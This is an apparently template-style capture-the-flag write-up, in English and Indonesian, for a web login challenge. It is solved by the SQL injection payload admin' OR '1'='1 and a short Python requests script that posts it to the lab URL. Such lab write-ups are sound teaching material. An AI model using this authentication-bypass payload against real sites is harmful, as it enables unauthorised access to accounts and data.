# Web Login

## Challenge Information

- **Event**: Example CTF 2024
- **Category**: Web
- **Points**: 100
- **Solves**: 45/100
- **Author**: CTF Organizer

## Description

```
A simple login page. Can you find a way to bypass it?

URL: http://example-ctf.com:8080/login
```

## Attachments

- None (live web challenge)

## Solution

### Analisis Awal

Ketika membuka URL, kita menemukan halaman login sederhana dengan form username dan password. Tidak ada hints yang jelas di source code HTML.

### Langkah Penyelesaian

#### Step 1: Reconnaissance

Melihat source code halaman, kita menemukan comment yang menarik:

```html
<!-- TODO: Remove test credentials before production -->
```

#### Step 2: SQL Injection Testing

Mencoba beberapa payload SQL injection dasar:

```bash
Username: admin' OR '1'='1
Password: anything
```

#### Step 3: Berhasil Login

Dengan payload di atas, kita berhasil bypass authentication dan mendapatkan flag di dashboard.

### Exploit

```python
import requests

url = "http://example-ctf.com:8080/login"
payload = {
    "username": "admin' OR '1'='1",
    "password": "anything"
}

response = requests.post(url, data=payload)
print(response.text)
```

## Flag

```
flag{sql_1nj3ct10n_1s_d4ng3r0us}
```

## Tools Used

- Browser Developer Tools
- curl
- Python requests library

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Lessons Learned

- Always test for SQL injection in login forms
- Look for comments in source code
- Basic authentication bypass techniques are still common in CTFs
